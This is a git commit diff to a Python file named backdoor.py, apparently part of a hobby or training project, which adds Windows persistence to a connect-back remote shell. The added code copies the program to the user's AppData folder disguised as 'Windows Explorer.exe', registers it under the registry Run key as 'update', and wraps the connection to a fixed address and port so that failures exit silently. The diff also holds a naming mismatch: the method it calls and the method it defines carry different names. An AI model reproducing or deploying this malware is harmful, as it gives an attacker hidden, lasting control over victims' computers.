bc4222816249883410cd5e4f633b2e591b780049
deniseosoria <98625185+deniseosoria@users.noreply.github.com>
2023-03-29 00:28:21 -0400

    Update backdoor.py

--- backdoor.py
+++ backdoor.py
@@ -5,13 +5,22 @@ import os
 import base64
 import subprocess
 import sys
+import shutil
 
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistence()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call(
+                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
+    
     def reliable_send(self, data):
         json_data = json.dumps(data)
         self.connection.send(json_data)
@@ -65,6 +74,8 @@ class Backdoor:
 
             self.reliable_send(command_result)
 
-
-my_backdoor = Backdoor("192.168.88.148", 4444)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor("192.168.88.148", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
